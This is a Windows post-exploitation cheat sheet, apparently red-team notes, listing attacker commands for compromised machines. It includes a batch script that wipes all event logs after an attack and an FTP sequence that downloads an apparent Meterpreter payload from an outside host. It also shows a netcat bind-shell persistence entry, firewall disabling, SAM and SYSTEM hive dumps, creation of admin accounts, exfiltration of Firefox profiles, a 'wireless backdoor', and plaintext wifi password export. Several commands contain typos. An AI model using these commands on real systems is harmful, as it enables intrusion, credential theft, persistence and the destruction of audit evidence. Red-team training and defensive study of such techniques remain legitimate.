## Post-exploitation Techniques and Commands

* [Useful Commands for Windows Administrators](http://www.robvanderwoude.com/ntadmincommands.php) - Post-exploitation techniques and commands to elicit information from shell of compromised windows machine.
* [A-Z List of Windows Shell Commands](https://ss64.com/nt/) - A-Z Listing of all Windows CMD Commands
* [Red Team Field Manual](https://github.com/Agahlot/RTFM/blob/master/rtfm-red-team-field-manual.pdf) - Windows Post-Exploitation techniques and commands.

### Clear Log Files
A simple script to clear logs post attack.

**Create a batch file and execute it as admin.**

  @echo off
  FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
  IF (%adminTest%)==(Access) goto noAdmin
  for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
  echo.
  echo goto theEnd
  :do_clear
  echo clearing %1
  wevtutil.exe cl %1
  goto :eof
  :noAdmin
  exit
  
### Transfer files to compromised host via non-interactive shell 

In cases where you want to upload a file onto the compromised machine but you don't have an interactive shell where you simply upload the file, you can write it onto the compromised machine using FTP, feeding it one line at a time.  

**Create a blank file to write commands onto**
ftp -s:ftp_commands.txt

**Echo each command (you can also do this all in one line):**

echo open 10.9.122.8>ftp_commands.txt
echo anonymous>ftp_commands.txt
echo blah>ftp_commands.txt
echo binary>ftp_commands.txt
echo get met8888.exe>ftp_commands.txt
echo bye>ftp_commands.txt

*Instead of ftp_commands.txt, use a unique name, hide the file in a datastream, or hide the file in the folder. aka don't be obvi

### Query state of Firewall, Disable Firewall, Allow a Service Through

**Query state of firewall**:

netsh firewall show state

**Disable firewall**

netsh.exe firewall set opmode mode=disable profile=all

**Allow service through firewall**

netsh.exe firewall set portopening tcp 123 MYSERVICE enable all

netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe

HKLM\\software\\microsoft\\windows\\ currentversion\\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat

netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE


**Query current user and privilege information**

whoami

whoami /all

whoami /user

whoami /groups

whoami /priv

**[Users]**

net users: list users

**For more info on a user**:

net user <username> (for local user)
  
net user <username> /domain (for a domain user)

**View domain admins**:

net group "Domain Admins" /domain

**View name of domain controller**:

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC
  
**Add user**:

net users <username> <password> /add

**Add user to local administrators group**:

net localgroup administrators <username> /add

**Delete a user**:

net users username /delete /domain

**Change user's password**:

net users <username> <new_password>


**[Accounts & Groups]**

net accounts

net accounts /domain

net logalgroup administrators

net localgroup administrators /dmain

net group "domain Admins" /domain

net group "Enterprise Admins" /domain

net view /localgroup

net localgroup Administrators

net localgroup /Domain

gpresult: view group policy

gupdate: update group policy

gpresult /z

**[Network and misc information]**

systeminfo:  lists information about system

ipconfig/all: Query ip configuation

ipconfig /displaydns

route print: Prints machines routing table

arp -a: Lists all systems current in the machine's ARP table

nslookup: Query server information

nbtstat: Displays protocol stats and current TCP/IP connections using NetBIOS over TCP/IP

qwinsta: Query info about RDP sessions

net session: Query session information

net time \\computername (Shows the time of target computer)

net share: view shared resources on network



**[Query current drives on system]**

fsutil fsinfo drives


**[Grab SAM and SYSTEM files]**

type "C:/windows/repair/SAM"

type "C:/windows/repair/SYSTEM"


**[Tasks]**

tasklist /svc: lists running processes

taskkill /PID <process ID> /F : forcibly kill task
  
taskkill taskkill /PID xxx taskkill /IM name* of process to be terminated * can be used to kill all processes with same name

tasklist /V /S computername: Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount

qprocess*: Similar to tasklist but easier to read

at: Query current scheduled tasks

schtasks: Query scheduled tasks that your current user has access to see.

schtasks /query /fo csv /v > %TEMP%


**[Netstat]**

netstat -ano : to see what services are running on what ports

netstat -bano

netstat -r

netstat -na | findstr :443


**[Query information about server and workstation, Workstation domain name and Logon domain]**

net config server

net config workstation



**[Change drive to different drive letter]**

ex change to D:/ directory and list it's contents:

d: & dir

cd /d d: & dir

dir \\computername\share_or_admin_share\ (dir list a remote directory)

**[Cat contents of file located in D:/ directory]**

cd /d & type d:\blah\blah


**[net view]**

net view /domain[:DomainName]

net view \\computerName


**[Services]**

**View list processes started upon startup**

net start

wmic startup get caption,command


**[Query, Stop/Start/Pause Installed Services]**

sc query state= all

sc query <service>
  
sc <stop> <service>


**[Remote System Access]**

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

net share \\computername

tasklist /V /S computername

qwinsta /SERVER:computername

qprocess /SERVER:computername 



**[WMI]*

wmic bios

wmic qfe

wmic qfe get hotfixid (This gets patches IDs)

wmic startup

wmic service

wmic os

wmic process get caption,executablepath,commandline

wmic process call create “process_name” (executes a program)

wmic process where name=”process_name” call terminate (terminates program)

wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)

wmic useraccount (usernames, sid, and various security related goodies)

wmic useraccount get /ALL

wmic share get /ALL (you can use ? for gets help ! )

wmic startup list full (this can be a huge list!!!) 

wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)


**[Reg Command]**

reg save HKLM\Security security.hive (Save security hive to a file)

reg save HKLM\System system.hive (Save system hive to a file)

reg save HKLM\SAM sam.hive (Save sam to a file)=

reg add [\\TargetIPaddr\] [RegDomain][ \Key ]

reg export [RegDomain]\[Key] [FileName]

reg import [FileName ]

reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )


**[Deleting Logs]**

wevtutil el (list logs)

wevtutil cl


**[Uninstalling Software]**

wmic proud get name /value: gets software names

wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software



**[Permissions]**

icacls

Grant full access over directory and encompassing folders and files:

icacls "C:\windows" /grant Administrator:F /T

icacls "C:\" /grant "nt authority\system": F /T


**[Net use]**

net use: Map network shares

net use \\computername (maps IPC$ which does not show up as a drive)

net use \\computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)

**[Mount a remote share with the rights of the current user]**:

net use K: \\<ip>\<share>
  
dir K:

**[Enable remote desktop]**

reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f

net session: list session information

**[Other useful Commands]**

pkgmgr usefull /iu :"Package"

pkgmgr usefull /iu :"TellnetServer": install telnet service

pkgmgr /iu:"TelnetClient"

rundll32.exe user32.dll, LockWorkStation: locks the screen

wscript.exe <script js/vbs>

cscript.exe <script js/vbs/c#>

xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box

type "C:\documents and settings\administrator\userdata\index.dat"

type %WINDIR%\System32\drivers\etc\hosts: view contents of hosts files

type "c:\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Credentials"

cd "C:/Documents and settings\administrator\userdata" & dir

type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"

type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"

type "C:\documents and settings\administrator\userdata\index.dat"


# Windows CMD Network Commands

The Windows commands below will help you gather information about the victim system's network connections, devices and capabilities and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.

## ipconfig
### Retrieve Local DNS Cache Info
 * **Command with arguments**: `ipconfig /displaydns`
 * **Description**: Displays the system's local DNS cache.

### Retrieve NIC Info
 * **Command with arguments**: `ipconfig /all`
 * **Description**: Displays the full information about the system's network interface cards (NICs).

## Misc
### arp
 * **Command with arguments**: `arp -a`
 * **Description**: Lists all the systems currently in the machine's ARP table.

### wmic
 * **Command with arguments**: `wmic ntdomain list`
 * **Description**: Retrieve information about Domain and Domain Controller.

## net
For more information: http://technet.microsoft.com/en-us/library/bb490949.aspx

### Accounts
 * **Command with arguments**: `net accounts [/domain | /domain:OTHERDOMAINNAME]`
 * **Description**: Prints the password policy for the local system. Pass it the `/domain` option to query the domain for the domain password policy.


### Group
 * **Command with arguments**: `net group "GROUPNAME" /domain`
 * **Description**: Prints the members of the Administrators local group. The /domain switch can show you the list of current domain admins.
 
Note: This command can only be used on a Windows Domain Controller.
 


### Local Group
 * **Command with arguments**: `net localgroup "GROUPNAME" [/domain]`
 * **Description**: Prints the members of the local group "GROUPNAME". The `/domain` switch can show you members of domain groups.
 
Note: This command can only be used on a Windows Domain Controller.
 

### Queries SMB Hosts/Domain
 * **Command with arguments**: `net view [/domain | /domain:OTHERDOMAINNAME]`
 * **Description**: Queries NBNS/SMB (SAMBA) and tries to find all hosts in the system's current workgroup. Add the `/domain` option if the current system is joined to a domain. To query a different domain, use the `/domain:OTHERDOMAINNAME` option.

   
### Session
 * **Command with arguments**: `net session`
 * **Description**: Displays information about all connections to the computer. 
 
Note: Needs to be launched within an administrative command shell.
 

   
### Share
 * **Command with arguments**: `net share`
 * **Description**: Displays the system's currently shared SMB entries, and what path(s) they point to.

   
### Users (List local/domain)
 * **Command with arguments**: `net user [/domain]`
 * **Description**: Lists the local users or, if the `/domain` option is passed, users on the computer's domain. 
   
### Users (Detailed User Information)
 * **Command with arguments**: `net user %USERNAME% [/domain]`
 * **Description**: Lists detailed information about the current local user or, if the `/domain` option is passed, the account on the computer's domain. If it is a local user then drop the `/domain`. Important things to note are login times, last time changed password, logon scripts, and group membership. You may wish to run this twice, once with and once without the `/domain` switch to find both local and domain accounts.


## netsh
For more information: http://technet.microsoft.com/en-us/library/bb490939.aspx

### Network Services
 * **Command with arguments**: `netsh diag show all`
 * **Description**: Shows information on network services and adapters.

Note: Windows XP only.

 * **Output**:
   * (Coming soon!)  

### Wireless Backdoor Creation
 * **Command with arguments**: 
   1. `netsh wlan set hostednetwork mode=[allow\|disallow]`
   1. `netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary`
   1. `netsh wlan [start|stop] hostednetwork`
 * **Description**:
   1. Enables or disables hostednetwork service.
   1. Complete hosted network setup for creating a wireless backdoor.
   1. Starts or stops a wireless backdoor. See below to set it up.
 
Note: Windows 7 only.

 * **Output**:
   * (Coming soon!)  
   
### Wireless Profile Viewing
 * **Command with arguments**: `netsh wlan show profiles`
 * **Description**: Shows all saved wireless profiles. You may then export the info for those profiles with the other netsh commands listed here.

### Wireless Profile Exporting
 * **Command with arguments**: `netsh wlan export profile folder=. key=clear`
 * **Description**: Exports a user wifi profile with the password in plaintext to an XML file in the current working directory.


## netstat
For more information: http://technet.microsoft.com/en-us/library/bb490947.aspx

### Find Information about a specific Service
 * **Command with arguments**: `netstat -nabo | findstr /I (SERVICE|PROCESS|PORT)`
 * **Description**: If you are interested in finding out more information about a specific service, process or port this will provide greater depth of information. The `netstat -b` flag makes the command take longer but will output the process name using each of the connections. 

Note: Needs to be launched within an administrative command shell due to the `-b`.

  
### Find Listeners
 * **Command with arguments**: `netstat -na | findstr :80`
 * **Description**: Find all listening ports and connections on port 80 (replace 80 with your target such as `445` or `3389`).

### Find Listeners and Process IDs
 * **Command with arguments**: `netstat -nao | findstr /I listening`
 * **Description**: Find all listening ports and their associated PIDs (Process IDs). The `findstr /I` switch makes the search case insensitive. This could be important if you are looking for a buMPy service (example: `svchost` vs. `SVChost`) or don't know the case of it.


### List Ports and Connections
 * **Command with arguments**: `netstat -nabo`
 * **Description**: Lists ports on and connections with the system with corresponding process (`-b`), without performing DNS lookup (`-n`), all connections (`-a`) and what is the owning process ID (`-o`). The `-b` switch is the switch in this command that requires elevated or admin privileges to execute. Omit it and you do not need to have an admin cmd shell.
 
 Note: Needs to be launched within an administrative command shell.


### Routing Table
 * **Command with arguments**: `netstat -r`
 * **Description**: Displays the system's routing table.

# Windows CMD Config Commands

Commands that display information about the configuration of the victim and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.

## Misc
### c:\windows\system32\gathernetworkinfo.vbs
 * **Command**: `c:\windows\system32\gathernetworkinfo.vbs`
 * **Command with arguments**: NA
 * **Description**: **Windows 7 Only** Script included gathers data about the system and stores output in files in the `c:\windows\system32\config` directory. External link [here.](http://www.verboon.info/index.php/2011/06/the-gathernetworkinfo-vbs-script/) 
   
### echo
 * **Command**: `echo`
 * **Command with arguments**: `echo %COMSPEC%%`
 * **Description**: Determine the location of the command line interpreter such as cmd.exe.

### fsutil
 * **Command**: `set`
 * **Command with arguments**: `fsutil fsinfo drives`
 * **Description**: **Must be ADMIN to run this.** Lists the current drives on the system.
 
### gpresult
 * **Command**: `gpresult`
 * **Command with arguments**: `gpresult /z`
 * **Description**: Extremely verbose output of GPO (Group policy) settings as applied to the current system and user.
 
### set
 * **Command**: `set`
 * **Command with arguments**: NA
 * **Description**: Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.
 
### whoami
 * **Command**: `whoami`
 * **Command with arguments**: `whoami /all`
 * **Description**: Lists information about the user you are currently logged in as. Helpful for showing what groups, sid and privileges of this user. Not available in all versions of Windows but is in Windows Vista and more recent. According to [Wikipedia](http://en.wikipedia.org/wiki/Whoami), this command can be added to Windows 2000 using the resource kit and is installed in Windows XP SP2 Support Tools.
 
### type
 * **Command**: `type`
 * **Command with arguments**: `type %WINDIR%\System32\drivers\etc\hosts`
 * **Description**: Show the contents of a file. In this case, you can get the system's host file which does the local translation of IP address to hostname. This file may contain important servers.
 
## Registry (reg)
For more information: http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/reg.mspx?mfr=true or http://www.petri.co.il/reg_command_in_windows_xp.htm
 
### Add
 * **Command with arguments**: `reg add [\\TargetIPaddr\] [RegDomain\Key]`
 * **Description**: Adds a key to target machine's registry. Replace [\\TargetIPaddr] with your target system, [RegDomain\Key] with the registry domain and key you'd like to insert.

### Export
 * **Command with arguments**: `reg export [RegDomain\Key] [OUTFILE]`
 * **Description**: Exports a key to a file. Replace [RegDomain\Key] with the registry domain and key you'd like to insert and [OUTFILE] with the name of the file you would like to save the registry key in.
 
### Import
 * **Command with arguments**: `reg import [INFILE]`
 * **Description**: Imports content to target machine's registry. Replace [INFILE] with the file that has the content you wish to insert.

### Query (Local)
 * **Command with arguments**: `reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"`
 * **Description**: Securely registered executables within the system registry.

### Query (Remote)
 * **Command with arguments**: `reg query [\\TargetIPaddr\] [RegDomain\Key] /v [ValueName]`
 * **Description**: Retrieves a key and value from target machine's registry. Replace [\\TargetIPaddr] with your target system, [RegDomain\Key] with the registry domain and key you'd like to query.

### Save
 * **Command with arguments**: `reg save [HIVE] [OUTFILE]`
 * **Description**: **Must be run as an administrator.** Saves part of the registry to a file. Replace [HIVE] with HKLM\Security, HKLM\System, or HKLM\SAM and [OUTFILE] with the name of the file you would like to save the registry in.
 

## sc
sc.exe retrieves and sets control information about services. You can use sc.exe for testing and debugging service programs. For more information: http://technet.microsoft.com/en-us/library/bb490995.aspx. 
<div class="slide" style="cursor: pointer;">Help details can be found if you expand this section here: Show/Hide</div><div class="view"><code>C:\Users\tester>sc
DESCRIPTION:
        SC is a command line program used for communicating with the
        Service Control Manager and services.
USAGE:
        sc <server> [command] [service name] <option1> <option2>...

        The option <server> has the form "\\ServerName"
        Further help on commands can be obtained by typing: "sc [command]"
        Commands:
          query-----------Queries the status for a service, or
                          enumerates the status for types of services.
          queryex---------Queries the extended status for a service, or
                          enumerates the status for types of services.
          start-----------Starts a service.
          pause-----------Sends a PAUSE control request to a service.
          interrogate-----Sends an INTERROGATE control request to a service.
          continue--------Sends a CONTINUE control request to a service.
          stop------------Sends a STOP request to a service.
          config----------Changes the configuration of a service (persistent).
          description-----Changes the description of a service.
          failure---------Changes the actions taken by a service upon failure.
          failureflag-----Changes the failure actions flag of a service.
          sidtype---------Changes the service SID type of a service.
          privs-----------Changes the required privileges of a service.
          qc--------------Queries the configuration information for a service.
          qdescription----Queries the description for a service.
          qfailure--------Queries the actions taken by a service upon failure.
          qfailureflag----Queries the failure actions flag of a service.
          qsidtype--------Queries the service SID type of a service.
          qprivs----------Queries the required privileges of a service.
          qtriggerinfo----Queries the trigger parameters of a service.
          qpreferrednode--Queries the preferred NUMA node of a service.
          delete----------Deletes a service (from the registry).
          create----------Creates a service. (adds it to the registry).
          control---------Sends a control to a service.
          sdshow----------Displays a service's security descriptor.
          sdset-----------Sets a service's security descriptor.
          showsid---------Displays the service SID string corresponding to an arbitrary name.
          triggerinfo-----Configures the trigger parameters of a service.
          preferrednode---Sets the preferred NUMA node of a service.
          GetDisplayName--Gets the DisplayName for a service.
          GetKeyName------Gets the ServiceKeyName for a service.
          EnumDepend------Enumerates Service Dependencies.

        The following commands don't require a service name:
        sc <server> <command> <option>
          boot------------(ok | bad) Indicates whether the last boot should
                          be saved as the last-known-good boot configuration
          Lock------------Locks the Service Database
          QueryLock-------Queries the LockStatus for the SCManager Database
EXAMPLE:
        sc start MyService</code></div>

### Query Configuration
 * **Command with arguments**: `sc qc [servicename]`
 * **Description**: Queries the configuration information for a service. Things to look at here are the path to the executable, the start type (does it start at boot or on demand?), and service names.
 
### Query Status
 * **Command with arguments**: `sc query [servicename]`
 * **Description**: Queries the status for a service, or enumerates the status for types of services.

### Query Status Extended
 * **Command with arguments**: `sc queryex [servicename]`
 * **Description**: Queries the status for a service, or enumerates the status for types of services.

## wmi
According to Microsoft (http://msdn.microsoft.com/en-us/library/aa394531(v=vs.85).aspx), "the WMI command-line (WMIC) utility provides a command-line interface for WMI. WMIC is compatible with existing shells and utility commands." Additional information can also be found here https://isc.sans.edu/diary/Windows+Command-Line+Kung+Fu+with+WMIC/1229.

For some of these `wmic` commands that pull information (versus perform an action) you can add `list full` to the end and retrieve the data in a non-table format. Sometimes this view is easier to read. Using `list brief` shows less data. The examples below show several output formats.
 
### BIOS Information
 * **Command with arguments**: `wmic bios [list full]`
 * **Description**: Retrieves BIOS information including system serial number.
 
### Disk Information
 * **Command with arguments**: `wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber`
 * **Description**: Retrieve information about the harddrive.
 
### Patch IDs
 * **Command with arguments**: `wmic qfe get hotfixid`
 * **Description**: Retrieves BIOS information including system serial number.
 
### Process Create
 * **Command with arguments**: `wmic process call create [EXECUTABLE]`
 * **Description**: Launches an executable. Replace [EXECUTABLE] with the name of the executable you'd like to launch (for example: calc.exe). Do not include quotes around the value (for example: *DO* use calc.exe; do *NOT* use "calc.exe").
 
### Process Information
 * **Command with arguments**: `wmic process get caption,executablepath,commandline`
 * **Description**: Retrieves process names, captions, executable paths and command line flags.
     
### Process Terminate
 * **Command with arguments**: `wmic process where name="[PROCESS]" call terminate`
 * **Description**: Terminates a process. Replace [PROCESS] with the name of the process you'd like to terminate and you *DO* need the quotes around it (for example: calc.exe).

   
### Service Information
 * **Command with arguments**: `wmic service [list full]`
 * **Description**: Retrieves ton of information about all the services installed on the system.
 

### Share Information
 * **Command with arguments**: `wmic share [list brief]`
 * **Description**: Retrieve information about local shares.
 
   
### Startup Items
 * **Command with arguments**: `wmic startup [list brief]`
 * **Description**: Shows startup items, which user runs them and full paths to the executables.
 
 ### User Information
 * **Command with arguments**: `wmic useraccount [list full]`
 * **Description**:  Retrieve information about the user accounts on the system.
